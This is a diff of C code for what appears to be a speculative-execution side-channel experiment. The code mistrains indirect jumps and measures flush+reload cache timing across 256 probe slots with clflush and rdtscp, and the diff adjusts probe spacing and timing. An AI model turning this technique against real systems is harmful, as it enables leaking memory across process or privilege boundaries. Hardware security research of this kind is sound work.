@@ -16,7 +16,8 @@ void __attribute__((section(".fnptr"))) (*fn_ptr)(void);
 #define MAX_PAGES 100
 #define NUM_PROBES 256
 
-#define MAX_PROBE_SPACE (100003)
+#define MAX_PROBE_SPACE (1000003)
+uint16_t signal_idx = 0;
 double avgpct = 0;
 
 uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
@@ -30,6 +31,8 @@ uint64_t tot_time = 0;      // Number cycles total
 
 unsigned int junk=0;    // For rdtscp
 
+unsigned int junk2=0;
+
 
 void check_probes() {
     uint64_t t0, t1;
@@ -37,7 +40,7 @@ void check_probes() {
 
     int i, mix_i;
     for (i=0; i<NUM_PROBES; i++) {
-        //mix_i = ((i*13) + 7) & 15;
+        //mix_i = ((i*13) + 7) & 0xff;
         mix_i = i;
         addr = &probe_buf[mix_i*cur_probe_space];
         t0 = _rdtscp(&junk);
@@ -180,6 +183,9 @@ struct node {
 };
 
 
+
+
+uint64_t *ptr_space;
 void *the_ptr;
 
 
@@ -193,6 +199,41 @@ void nop()
 
 int main()
 {
+
+    int i;
+    int misses = 0;
+    uint64_t tot_pattern = 0;
+    uint64_t t0=0, t1=0;
+
+
+    probe_buf = malloc(MAX_PROBE_SPACE*NUM_PROBES);
+    if (probe_buf == NULL) {
+        perror("malloc");
+        return -1;
+    }
+
+    for (i=0; i<NUM_PROBES; i++) {
+        memset(&probe_buf[i*MAX_PROBE_SPACE], i, MAX_PROBE_SPACE);
+        _mm_clflush(&probe_buf[i*cur_probe_space]);
+    }
+
+
+
+
+    ptr_space = malloc(4096*10*sizeof(uint64_t));
+    if (!ptr_space) {
+        perror("malloc");
+        return -1;
+    }
+
+
+    for (i=0; i<10; i++) {
+        memset(&ptr_space[i*4096], i, 4096);
+        _mm_clflush(&probe_buf[i*4096]);
+    }
+
+    ptr_space[10324] = (uint64_t)(void*)check_probes;
+
     // Our speculative jump has two in-order targets:
     // We would like the first one to be quick,
     // and the second one slow (so it gets mispeculated)
@@ -207,41 +248,41 @@ int main()
     struct node *n2 = malloc(sizeof(struct node));
 
     n2->next = NULL;
-    n2->jmp = check_probes;
-
+    n2->jmp = &ptr_space[10324];
     // TODO: uncache n2->jmp
 
     struct node n1;
     n1.next = n2;
     // This is the address of our first indirect jump (quick)
-    n1.jmp = (void*)0x7ffff77e396d;    // TODO: make this less ugly?
+    the_ptr = (void*)0x7ffff77e396d;
+    n1.jmp = &the_ptr;    // TODO: make this less ugly?
 
 
-    the_ptr = nop;
-    void *ptr = &the_ptr;
-
-    probe_buf = malloc(MAX_PROBE_SPACE*NUM_PROBES);
-    if (probe_buf == NULL) {
-        perror("malloc");
-        return -1;
-    }
-
-    int i;
+    //void *ptr = &the_ptr;
     setup();
     while (1) {
         //_mm_clflush(n2->jmp);
-        for (i=0; i<15000; i++) {
-            _mm_clflush(&n2);
+        for (i=0; i<10000; i++) {
+            //_mm_clflush(n2->jmp);
+            //_mm_clflush(&n2->jmp);
+            //_mm_clflush(&n2);
             //spec_entry();
+            //check_probes();
+            t0 = _rdtscp(&junk2);
             do_pattern(&n1);
+            t1 = _rdtscp(&junk2);
+            tot_pattern += (t1-t0);
             usleep(1);
         }
+        printf("took %ld cylces average\n", tot_pattern/10000);
+        tot_pattern = 0 ;
 
         // Check stats...
         uint64_t avg = 0;
         if (cache_hits > 0) avg = tot_time/cache_hits;
 
         uint64_t max_res=0, max_i=0;
+        int mix_i;
         for (i=0; i<NUM_PROBES; i++) {
             if (results[i]>max_res) {
                 max_res = results[i];
@@ -253,8 +294,14 @@ int main()
             printf("[%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld\n",
             max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space);
 
+            signal_idx++;
+            misses = 0;
+
         } else {
             printf("--[%lu]: %lu, %lu avg cycles ps %ld, 13 had: %lu, %lu tot hits\n", max_i, max_res, avg, cur_probe_space, results[13], cache_hits);
+            misses++;
+            cur_probe_space += 63;
+            cur_probe_space %= MAX_PROBE_SPACE;
         }
 
         cache_hits = 0;
